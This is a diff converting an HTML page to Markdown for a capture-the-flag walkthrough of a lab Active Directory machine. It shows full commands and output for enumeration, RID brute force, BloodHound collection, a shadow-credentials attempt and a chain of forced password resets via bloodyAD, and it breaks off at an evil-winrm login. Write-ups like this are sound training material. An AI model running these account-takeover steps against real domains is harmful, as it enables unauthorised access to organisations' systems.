@@ -1,79 +1,11 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Walkthroughs</title>
-    <link rel="stylesheet" href="/src/styles.css">
-</head>
+## Recon
+First of all, on the machine description there are already some user credentials:
 
-<script>
-    document.addEventListener('DOMContentLoaded', function () {
-        const lateralIndex = document.getElementById('lateralIndex');
-        const menuButton = document.querySelector('.menu-button');
-        const dropdownToggles = document.querySelectorAll('.dropdown-toggle');
-        const dropdownMenus = document.querySelectorAll('.dropdown-menu');
+_As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich_
 
-        lateralIndex.classList.remove('open'); // Ensures it's hidden on load (off-screen)
-        dropdownMenus.forEach(menu => menu.style.display = 'none'); // Hide dropdowns initially
-
-        menuButton.addEventListener('click', function () {
-            lateralIndex.classList.toggle('open'); // Toggle the 'open' class to slide the menu
-        });
-
-        dropdownToggles.forEach(toggle => {
-            toggle.addEventListener('click', function () {
-                const dropdownMenu = this.nextElementSibling; // Get the next <ul> (the dropdown)
-                if (dropdownMenu.style.display === 'block') {
-                    dropdownMenu.style.display = 'none';
-                } else {
-                    dropdownMenu.style.display = 'block';
-                }
-            });
-        });
-    });
-
-</script>
-
-
-<body>
-    <!-- Upper Menu -->
-    <div class="upper-menu">
-        <button class="menu-button">></button>
-        <nav>
-            <a href="/">Homepage</a>
-            <a href="/walkthrough/">Walkthroughs</a>
-            <a href="/tools">Tools</a>
-            <a href="/attacks/">Attacks</a>
-            <a href="/protocols">Protocols</a>
-            <a href="/other">Other</a>
-        </nav>
-    </div>
-
-    <!-- Lateral Index -->
-    <div class="lateral-index" id="lateralIndex">
-        <ul id="indexList">
-            <a href="#recon"><li class="index-item">Recon</li></a>
-            <li class="index-item">
-                <span class="dropdown-toggle">Attack</span>
-                <ul class="dropdown-menu">
-                    <a href="#user"><li>Gainig access</li></a>
-                    <a href="#privesc"><li>Privilege Scalation</li></a>
-                </ul>
-            </li>
-            <a href="#solutions"><li class="index-item">Solutions</li></a>
-            <a href="#links"><li class="index-item">Links</li></a>
-        </ul>
-    </div>
-
-    <!-- Main Content -->
-    <div class="main-content">
-<h1>Administrator</h1>
-<h2 id="recon">Recon</h2>
-<p>First of all, on the machine description there are already some user credentials:</p>
-<p><em>As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich</em></p>
-<p>First, let's do an <code>nmap</code> scan:</p>
-<pre><code>└─$ nmap -p- --min-rate 10000 -T4 $target 1&gt; ports.txt &amp;&amp; echo &quot;All discovered open ports:&quot; &amp;&amp; cat ports.txt &amp;&amp; nmap -sC -sV -p$(tail -n +7 ports.txt | head -n -2 | cut -d ' ' -f 1 | cut -d '/' -f 1 | sed -z 's/\n/,/g') $target | tee nmap.txt
+First, let's do an `nmap` scan:
+```
+└─$ nmap -p- --min-rate 10000 -T4 $target 1> ports.txt && echo "All discovered open ports:" && cat ports.txt && nmap -sC -sV -p$(tail -n +7 ports.txt | head -n -2 | cut -d ' ' -f 1 | cut -d '/' -f 1 | sed -z 's/\n/,/g') $target | tee nmap.txt
 All discovered open ports:
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-31 20:12 CEST
 Nmap scan report for 10.10.11.42
@@ -155,24 +87,27 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 71.88 seconds
-</code></pre>
-<p>Looks like this is an AD DC...</p>
-<ul>
-<li><strong>DNS</strong></li>
-<li><strong>Kerberos</strong>: AD authentication service</li>
-<li><strong>msrpc</strong>: Microsoft Remote Procedure Call, is a service that lets clients request services or run code on the remote server, is used, for example by smb.</li>
-<li><strong>Kpasswd5</strong>: Service for changing kerberos passwords.</li>
-<li><strong>netbios</strong>: For resolving names, session establishment, ...</li>
-<li><strong>ldap</strong>: For active directory</li>
-</ul>
-<p>I also see that it has WinRM for remote administration. And multiple RPC endpoints.</p>
-<p>Let's try to do a ldap query to see if the permissions are misconfigured and can be exploited to see additional information of the domain without an authenticated account.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
-└─$ ldapsearch -x -H ldap://$target -b &quot;&quot; -s base &quot;(objectClass=*)&quot;
+```
+
+Looks like this is an AD DC...
+
+- **DNS**
+- **Kerberos**: AD authentication service
+- **msrpc**: Microsoft Remote Procedure Call, is a service that lets clients request services or run code on the remote server, is used, for example by smb.
+- **Kpasswd5**: Service for changing kerberos passwords.
+- **netbios**: For resolving names, session establishment, ...
+- **ldap**: For active directory
+
+I also see that it has WinRM for remote administration. And multiple RPC endpoints.
+
+Let's try to do a ldap query to see if the permissions are misconfigured and can be exploited to see additional information of the domain without an authenticated account.
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
+└─$ ldapsearch -x -H ldap://$target -b "" -s base "(objectClass=*)"
 # extended LDIF
 #
 # LDAPv3
-# base &lt;&gt; with scope baseObject
+# base <> with scope baseObject
 # filter: (objectClass=*)
 # requesting: ALL
 #
@@ -258,9 +193,9 @@ supportedCapabilities: 1.2.840.113556.1.4.1935
 supportedCapabilities: 1.2.840.113556.1.4.2080
 supportedCapabilities: 1.2.840.113556.1.4.2237
 subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=administrator,DC
-    =htb
+ =htb
 serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configurat
-    ion,DC=administrator,DC=htb
+ ion,DC=administrator,DC=htb
 schemaNamingContext: CN=Schema,CN=Configuration,DC=administrator,DC=htb
 namingContexts: DC=administrator,DC=htb
 namingContexts: CN=Configuration,DC=administrator,DC=htb
@@ -270,7 +205,7 @@ namingContexts: DC=ForestDnsZones,DC=administrator,DC=htb
 isSynchronized: TRUE
 highestCommittedUSN: 131212
 dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN
-    =Sites,CN=Configuration,DC=administrator,DC=htb
+ =Sites,CN=Configuration,DC=administrator,DC=htb
 dnsHostName: dc.administrator.htb
 defaultNamingContext: DC=administrator,DC=htb
 currentTime: 20250401012609.0Z
@@ -282,21 +217,25 @@ result: 0 Success
 
 # numResponses: 2
 # numEntries: 1
-</code></pre>
-<p>I add the machine hostname on the hosts file, it can be seen on the ldap query <strong>dnsHostName: dc.administrator.htb</strong> a part from that info, I don't see anything else especial.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
+```
+
+I add the machine hostname on the hosts file, it can be seen on the ldap query **dnsHostName: dc.administrator.htb** a part from that info, I don't see anything else especial.
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ cat /etc/hosts
 127.0.0.1       localhost
 127.0.1.1       zero
 10.10.11.42     administrator.htb dc.administrator.htb
-</code></pre>
-<p>As expected, I can't do any more advanced queries (I query all the users with the <code>objectClass=user</code> filter ):</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
-└─$ ldapsearch -x -H ldap://$target -b &quot;DC=administrator,DC=htb&quot; -s sub &quot;(objectClass=user)&quot;  
+```
+
+As expected, I can't do any more advanced queries (I query all the users with the `objectClass=user` filter ):
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
+└─$ ldapsearch -x -H ldap://$target -b "DC=administrator,DC=htb" -s sub "(objectClass=user)"  
 # extended LDIF
 #
 # LDAPv3
-# base &lt;DC=administrator,DC=htb&gt; with scope subtree
+# base <DC=administrator,DC=htb> with scope subtree
 # filter: (objectClass=user)
 # requesting: ALL
 #
@@ -305,12 +244,14 @@ result: 0 Success
 search: 2
 result: 1 Operations error
 text: 000004DC: LdapErr: DSID-0C090C78, comment: In order to perform this opera
-    tion a successful bind must be completed on the connection., data 0, v4f7c
+ tion a successful bind must be completed on the connection., data 0, v4f7c
 
 # numResponses: 1
-</code></pre>
-<p>I try to connect via FTP, but it gives the error <strong>530 User cannot log in, home directory inaccessible.</strong> This is very interesting, because when ftp into server, it connects to the users's home directory, like a chroot in linux, worth noting once we get more user credentials.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
+```
+
+I try to connect via FTP, but it gives the error **530 User cannot log in, home directory inaccessible.** This is very interesting, because when ftp into server, it connects to the users's home directory, like a chroot in linux, worth noting once we get more user credentials.
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ ftp administrator.htb
 Connected to administrator.htb.
 220 Microsoft FTP Service
@@ -319,10 +260,12 @@ Name (administrator.htb:oriol): olivia
 Password: 
 530 User cannot log in, home directory inaccessible.
 ftp: Login failed
-ftp&gt; 
-</code></pre>
-<p>Let's connect with the credentials given, first I try to connect via SMB:</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
+ftp> 
+```
+
+Let's connect with the credentials given, first I try to connect via SMB:
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ smbclient -L administrator.htb -U olivia%ichliebedich 
 
         Sharename       Type      Comment
@@ -335,55 +278,60 @@ ftp&gt;
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to administrator.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
-</code></pre>
-<p>I try to connect to the default shared folders (ADMIN\$, C\$, IPC\$) but no luck, but there is something interesting on <code>SYSVOL</code></p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
+```
+
+
+I try to connect to the default shared folders (ADMIN\$, C\$, IPC\$) but no luck, but there is something interesting on `SYSVOL`
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ smbclient \\\\administrator.htb\\NETLOGON -U olivia%ichliebedich 
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&gt; LS
-    .                                   D        0  Fri Oct  4 21:48:08 2024
-    ..                                  D        0  Fri Oct  4 21:54:15 2024
+Try "help" to get a list of possible commands.
+smb: \> LS
+  .                                   D        0  Fri Oct  4 21:48:08 2024
+  ..                                  D        0  Fri Oct  4 21:54:15 2024
 
 5606911 blocks of size 4096. 1857309 blocks available
-smb: \&gt; exit
-
+smb: \> exit
+                                                                                                                                                                                                                                            
 ┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ smbclient \\\\administrator.htb\\SYSVOL -U olivia%ichliebedich
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&gt; ls
-    .                                   D        0  Fri Oct  4 21:48:08 2024
-    ..                                  D        0  Fri Oct  4 21:48:08 2024
-    administrator.htb                  Dr        0  Fri Oct  4 21:48:08 2024
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Oct  4 21:48:08 2024
+  ..                                  D        0  Fri Oct  4 21:48:08 2024
+  administrator.htb                  Dr        0  Fri Oct  4 21:48:08 2024
 
 5606911 blocks of size 4096. 1857309 blocks available
-smb: \&gt; cd administrator.htb
-smb: \administrator.htb\&gt; ls
-    .                                   D        0  Fri Oct  4 21:54:15 2024
-    ..                                  D        0  Fri Oct  4 21:48:08 2024
-    DfsrPrivate                      DHSr        0  Fri Oct  4 21:54:15 2024
-    Policies                            D        0  Fri Oct  4 21:48:32 2024
-    scripts                             D        0  Fri Oct  4 21:48:08 2024
+smb: \> cd administrator.htb
+smb: \administrator.htb\> ls
+  .                                   D        0  Fri Oct  4 21:54:15 2024
+  ..                                  D        0  Fri Oct  4 21:48:08 2024
+  DfsrPrivate                      DHSr        0  Fri Oct  4 21:54:15 2024
+  Policies                            D        0  Fri Oct  4 21:48:32 2024
+  scripts                             D        0  Fri Oct  4 21:48:08 2024
 
 5606911 blocks of size 4096. 1857053 blocks available
-smb: \administrator.htb\&gt;
-</code></pre>
-<p>I follow the first answer of this superuser question to recursively download all the files on the <code>administrator.htb</code> directory</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
+smb: \administrator.htb\>
+```
+
+I follow the first answer of this superuser question to recursively download all the files on the `administrator.htb` directory
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ smbclient \\\\administrator.htb\\SYSVOL -U olivia%ichliebedich
-Try &quot;help&quot; to get a list of possible commands.
-smb: \&gt; cd administrator.htb
-smb: \administrator.htb\&gt; ls
-    .                                   D        0  Fri Oct  4 21:54:15 2024
-    ..                                  D        0  Fri Oct  4 21:48:08 2024
-    DfsrPrivate                      DHSr        0  Fri Oct  4 21:54:15 2024
-    Policies                            D        0  Fri Oct  4 21:48:32 2024
-    scripts                             D        0  Fri Oct  4 21:48:08 2024
+Try "help" to get a list of possible commands.
+smb: \> cd administrator.htb
+smb: \administrator.htb\> ls
+  .                                   D        0  Fri Oct  4 21:54:15 2024
+  ..                                  D        0  Fri Oct  4 21:48:08 2024
+  DfsrPrivate                      DHSr        0  Fri Oct  4 21:54:15 2024
+  Policies                            D        0  Fri Oct  4 21:48:32 2024
+  scripts                             D        0  Fri Oct  4 21:48:08 2024
 
                 5606911 blocks of size 4096. 2060375 blocks available
-smb: \administrator.htb\&gt; mask &quot;&quot;
-smb: \administrator.htb\&gt; recurse ON
-smb: \administrator.htb\&gt; prompt OFF
-smb: \administrator.htb\&gt; mget *
+smb: \administrator.htb\> mask ""
+smb: \administrator.htb\> recurse ON
+smb: \administrator.htb\> prompt OFF
+smb: \administrator.htb\> mget *
 NT_STATUS_ACCESS_DENIED listing \administrator.htb\DfsrPrivate\*
 getting file \administrator.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
 getting file \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
@@ -392,13 +340,15 @@ getting file \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\
 getting file \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Registry.pol of size 184 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Registry.pol (1.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)
 getting file \administrator.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (6.3 KiloBytes/sec) (average 4.5 KiloBytes/sec)
 getting file \administrator.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 4262 as Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (24.2 KiloBytes/sec) (average 7.4 KiloBytes/sec)
-smb: \administrator.htb\&gt; 
-</code></pre>
-<p>The folders <code>DfsrPrivate</code> and <code>scripts</code> are empty, but the <code>policies</code> seems to (obviously) have some windows policies inside:</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator/Policies]
+smb: \administrator.htb\> 
+```
+
+The folders `DfsrPrivate` and `scripts` are empty, but the `policies` seems to (obviously) have some windows policies inside:
+```
+┌──(oriol㉿zero)-[~/htb/administrator/Policies]
 └─$ ls
 {31B2F340-016D-11D2-945F-00C04FB984F9}  {6AC1786C-016F-11D2-945F-00C04fB984F9}
-
+                                                                                                                                                                                                                                            
 ┌──(oriol㉿zero)-[~/htb/administrator/Policies]
 └─$ tree                        
 .
@@ -429,38 +379,45 @@ smb: \administrator.htb\&gt;
     └── USER
 
 19 directories, 7 files
-</code></pre>
-<p>The Group Policy Templates or GPT (which are AD GPOs) are stored on the Policies directory inside the SYSVOL one. This is where the AD computer clients download the policies, and also the different AD DC replicate.</p>
-<p>Looking at it, those are 2 different GPOs.
-- <strong>GPT.INI</strong> Contains basinc information about the GPO, like version, display name and others
-- <strong>Machine directory</strong> contains computer-specific policy settings:
-    - <strong>Registry.pol</strong> Stores registry-based policy settings that apply to computers
-    - <strong>Scripts:</strong> Contains shutdown and startup scripts
-    - <strong>Microsoft/Windows NT/SecEdit/GptTmpl.inf</strong> Security template containing security policy settings
-- <strong>User</strong> directory contains user-specific policy settings
-- <strong>comment.cmtx</strong> Administrative comments</p>
-<ul>
-<li>https://sdmsoftware.com/whitepapers/understanding-group-policy-storage/</li>
-</ul>
-<p>I don't see anything useful on the comment.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
+```
+
+The Group Policy Templates or GPT (which are AD GPOs) are stored on the Policies directory inside the SYSVOL one. This is where the AD computer clients download the policies, and also the different AD DC replicate.
+
+Looking at it, those are 2 different GPOs.
+- **GPT.INI** Contains basinc information about the GPO, like version, display name and others
+- **Machine directory** contains computer-specific policy settings:
+	- **Registry.pol** Stores registry-based policy settings that apply to computers
+	- **Scripts:** Contains shutdown and startup scripts
+	- **Microsoft/Windows NT/SecEdit/GptTmpl.inf** Security template containing security policy settings
+- **User** directory contains user-specific policy settings
+- **comment.cmtx** Administrative comments
+
+- https://sdmsoftware.com/whitepapers/understanding-group-policy-storage/
+
+
+I don't see anything useful on the comment.
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ cat Policies/\{6AC1786C-016F-11D2-945F-00C04fB984F9\}/MACHINE/comment.cmtx 
-&lt;?xml version='1.0' encoding='utf-8'?&gt;
-&lt;policyComments xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; revision=&quot;1.0&quot; schemaVersion=&quot;1.0&quot; xmlns=&quot;http://www.microsoft.com/GroupPolicy/CommentDefinitions&quot;&gt;
-    &lt;policyNamespaces&gt;
-    &lt;using prefix=&quot;ns0&quot; namespace=&quot;Microsoft.Policies.TerminalServer&quot;&gt;&lt;/using&gt;
-    &lt;/policyNamespaces&gt;
-    &lt;comments&gt;
-    &lt;admTemplate&gt;&lt;/admTemplate&gt;
-    &lt;/comments&gt;
-    &lt;resources minRequiredRevision=&quot;1.0&quot;&gt;
-    &lt;stringTable&gt;&lt;/stringTable&gt;
-    &lt;/resources&gt;
-&lt;/policyComments&gt;
-</code></pre>
-<p>There are no interesting comments. I don't get the namespace TerminalServer, as it doesn't have the rdp port open... maybe something like session time limits or device redirection(?)</p>
-<p>Let's check the <code>GptTmpl.inf</code> which includes security policy settings.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
+<?xml version='1.0' encoding='utf-8'?>
+<policyComments xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" revision="1.0" schemaVersion="1.0" xmlns="http://www.microsoft.com/GroupPolicy/CommentDefinitions">
+  <policyNamespaces>
+    <using prefix="ns0" namespace="Microsoft.Policies.TerminalServer"></using>
+  </policyNamespaces>
+  <comments>
+    <admTemplate></admTemplate>
+  </comments>
+  <resources minRequiredRevision="1.0">
+    <stringTable></stringTable>
+  </resources>
+</policyComments>
+```
+
+There are no interesting comments. I don't get the namespace TerminalServer, as it doesn't have the rdp port open... maybe something like session time limits or device redirection(?)
+
+Let's check the `GptTmpl.inf` which includes security policy settings.
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
 └─$ cat Policies/\{6AC1786C-016F-11D2-945F-00C04fB984F9\}/MACHINE/Microsoft/Windows\ NT/SecEdit/GptTmpl.inf 
 ��[Unicode]
 Unicode=yes
@@ -470,7 +427,7 @@ MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=
 MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
 MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
 [Version]
-signature=&quot;$CHICAGO$&quot;
+signature="$CHICAGO$"
 Revision=1
 [Privilege Rights]
 SeAssignPrimaryTokenPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
@@ -497,27 +454,34 @@ SeSystemTimePrivilege = *S-1-5-19,*S-1-5-32-544,*S-1-5-32-549
 SeTakeOwnershipPrivilege = *S-1-5-32-544
 SeUndockPrivilege = *S-1-5-32-544
 SeEnableDelegationPrivilege = *S-1-5-32-544
-</code></pre>
-<p>The signature is <code>$CHICAGO$</code>  indicating that is a valid inf for windows.
-This lines:</p>
-<pre><code>MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
+```
+
+The signature is `$CHICAGO$`  indicating that is a valid inf for windows.
+This lines:
+```
+MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
 MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
 MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
 MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
-</code></pre>
-<p>Are registry values, with the full path, and the type (4) and value (1) at the end. In this case the type of all is a DWORD
+```
+
+Are registry values, with the full path, and the type (4) and value (1) at the end. In this case the type of all is a DWORD
 - https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/3a14ca47-a22f-43c5-b35e-6be791003ca7
 And what this do is (by order)
 - Enforces LDAP signing (prevents downgrade attacks).
 - Enforces Netlogon channel encryption
 - Requires SMB packet signing
-- Enables SMB signing</p>
-<p>And then, the <code>[Privilege Rights]</code> sets different privileges to some SID. Some of them are the "default ones", like the <code>*S-1-5-32-544</code> which is <strong>BUILTIN\Administrators</strong>
+- Enables SMB signing
+
+And then, the `[Privilege Rights]` sets different privileges to some SID. Some of them are the "default ones", like the `*S-1-5-32-544` which is **BUILTIN\Administrators**
 More on the SID can be found in here:
-- https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers</p>
-<p>I see some SID which are not default and are custom, maybe I'll come back later here once I've got more users.</p>
-<p>I will do a RID brute force scan to discover new users and groups</p>
-<pre><code>┌──(oriol㉿zero)-[~]
+- https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers
+
+I see some SID which are not default and are custom, maybe I'll come back later here once I've got more users.
+
+I will do a RID brute force scan to discover new users and groups
+```
+┌──(oriol㉿zero)-[~]
 └─$ crackmapexec smb administrator.htb -u olivia -p 'ichliebedich' --users --rid-brute
 SMB         administrator.htb 445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
 SMB         administrator.htb 445    DC               [+] administrator.htb\olivia:ichliebedich 
@@ -565,26 +529,31 @@ SMB         administrator.htb 445    DC               1112: ADMINISTRATOR\emily 
 SMB         administrator.htb 445    DC               1113: ADMINISTRATOR\ethan (SidTypeUser)
 SMB         administrator.htb 445    DC               3601: ADMINISTRATOR\alexander (SidTypeUser)
 SMB         administrator.htb 445    DC               3602: ADMINISTRATOR\emma (SidTypeUser)
-</code></pre>
-<p>We got the users:
+```
+
+We got the users:
 - michael
 - benjamin
 - emily
 - ethan
 - alexander
-- emma</p>
-<p><strong>How does the RID brute force work?</strong>
+- emma
+
+**How does the RID brute force work?**
 What is RID? Is the last bit of the SID which represents the user. For example the RID of 500 is for the Administrator.
 First, we need some user credentials because the anonymous enumeration is blocked and the SID to name translation.
-    - Establish an smb session with the credentials provided
-    - Gets the SID bit that corresponds to the domain querying the known administrator SID
-    - Uses Local Security Authority (LSARPC) to query SID with the RID from 500 to a high number.
-    - Gets the successful SID with the random RID that translated to a user</p>
-<p>Looking a the policies inf file, I see that the user emily has <code>SeInteractiveLogonRight</code> privileges, which a quick search returns that this privilege allows the user to log remotely to the computer.
-- https://www.ultimatewindowssecurity.com/wiki/page.aspx?spid=AllowLogOnLocally</p>
-<p>Let's try to use Bloodhound to export all the AD information available to see the relationships and possible attack vectors graphically</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
-└─$ bloodhound-python -u olivia -p &quot;ichliebedich&quot; -d administrator.htb -ns 10.10.11.42 -c All
+ - Establish an smb session with the credentials provided
+ - Gets the SID bit that corresponds to the domain querying the known administrator SID
+ - Uses Local Security Authority (LSARPC) to query SID with the RID from 500 to a high number.
+ - Gets the successful SID with the random RID that translated to a user
+
+Looking a the policies inf file, I see that the user emily has `SeInteractiveLogonRight` privileges, which a quick search returns that this privilege allows the user to log remotely to the computer.
+- https://www.ultimatewindowssecurity.com/wiki/page.aspx?spid=AllowLogOnLocally
+
+Let's try to use Bloodhound to export all the AD information available to see the relationships and possible attack vectors graphically
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
+└─$ bloodhound-python -u olivia -p "ichliebedich" -d administrator.htb -ns 10.10.11.42 -c All
 INFO: Found AD domain: administrator.htb
 INFO: Getting TGT for user
 WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
@@ -602,59 +571,74 @@ INFO: Found 0 trusts
 INFO: Starting computer enumeration with 10 workers
 INFO: Querying computer: dc.administrator.htb
 INFO: Done in 00M 08S
-</code></pre>
-<p>I feed the jsons to the database and analyze a little bit the AD connections.</p>
-<p>I see this:</p>
-<p><img src="src/administrator01.png"></p>
-<p>Olivia has a "First Degree Object Control" of the user Michael with <code>GenericAll</code> properties, this means we can change the user's password, or use a credentials shadow attack, like on the EscapeTwo machine.</p>
-<p>And then, Michael has <code>ForceChangePassword</code> privileges on the user Benjamin.</p>
-<p><img src="src/administrator02.png"></p>
-<p>Then, Benjamin doesn't have any more privileges on other users, but I think it's pretty clear that the user flag is on the Benjamin user, and from there we'll escalate privileges.</p>
-<h2>Attack phase</h2>
-<h3 id="user">User</h3>
-<p>I don't even bother to remote shell with the Olivia user and go directly to do a shadow credential attack on the Michael user. I re-use the commands from the EscpeTwo machine.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
-└─$ certipy-ad shadow auto -u 'rosa@administrator.htb' -p &quot;ichliebedich&quot; -account 'michael' -dc-ip 10.10.11.42
+```
+
+I feed the jsons to the database and analyze a little bit the AD connections.
+
+I see this:
+![[administrator01.png]]
+
+Olivia has a "First Degree Object Control" of the user Michael with `GenericAll` properties, this means we can change the user's password, or use a credentials shadow attack, like on the EscapeTwo machine.
+
+And then, Michael has `ForceChangePassword` privileges on the user Benjamin.
+![[administrator02.png]]
+
+Then, Benjamin doesn't have any more privileges on other users, but I think it's pretty clear that the user flag is on the Benjamin user, and from there we'll escalate privileges.
+
+## Attack phase
+### User
+I don't even bother to remote shell with the Olivia user and go directly to do a shadow credential attack on the Michael user. I re-use the commands from the EscpeTwo machine.
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
+└─$ certipy-ad shadow auto -u 'rosa@administrator.htb' -p "ichliebedich" -account 'michael' -dc-ip 10.10.11.42
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [-] Got error: socket ssl wrapping error: [Errno 104] Connection reset by peer
 [-] Use -debug to print a stacktrace
-</code></pre>
-<p>It raises an error... Looking at the internet it's because the server doesn't have LDAP over SSH enabled:</p>
-<p>
-<ul><li>https://github.com/fortra/impacket/issues/581</li></ul>
-</p>
-<p>So, let's try to change the password of the user. I will have to be quick to also reset the password of Benjamin, as, from my experience, there is some cleanup script that reset the password to the original one to not interfere the experience of the other users playing this box.</p>
-<p>I will use <code>bloody-ad</code> with the <code>set password</code> command.</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
-└─$ bloodyAD -u &quot;olivia&quot; -p &quot;ichliebedich&quot; -d &quot;Administrator.htb&quot; --host &quot;10.10.11.42&quot; set password &quot;Michael&quot; &quot;zero123&quot;
-[+] Password changed successfully!
-</code></pre>
-<p>Do the same for Benjamin:</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
-└─$ bloodyAD -u &quot;michael&quot; -p &quot;zero123&quot; -d &quot;Administrator.htb&quot; --host &quot;10.10.11.42&quot; set password &quot;benjamin&quot; &quot;zero123&quot;
-[+] Password changed successfully!
-</code></pre>
-<p>Seems like Benjamin can't remote to the server:</p>
-<pre><code>┌──(oriol㉿zero)-[~/htb/administrator]
-└─$ evil-winrm -i administrator.htb -u &quot;benjamin&quot; -p &quot;zero123&quot;
+```
 
+It raises an error... Looking at the internet it's because the server doesn't have LDAP over SSH enabled:
+- https://github.com/fortra/impacket/issues/581
+
+So, let's try to change the password of the user. I will have to be quick to also reset the password of Benjamin, as, from my experience, there is some cleanup script that reset the password to the original one to not interfere the experience of the other users playing this box.
+
+I will use `bloody-ad` with the `set password` command.
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
+└─$ bloodyAD -u "olivia" -p "ichliebedich" -d "Administrator.htb" --host "10.10.11.42" set password "Michael" "zero123"
+[+] Password changed successfully!
+```
+
+Do the same for Benjamin:
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
+└─$ bloodyAD -u "michael" -p "zero123" -d "Administrator.htb" --host "10.10.11.42" set password "benjamin" "zero123"
+[+] Password changed successfully!
+```
+
+Seems like Benjamin can't remote to the server:
+```
+┌──(oriol㉿zero)-[~/htb/administrator]
+└─$ evil-winrm -i administrator.htb -u "benjamin" -p "zero123"
+                                        
 Evil-WinRM shell v3.7
-
+                                        
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
-
+                                        
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
+                                        
 Info: Establishing connection to remote endpoint
 
 
-
+                                        
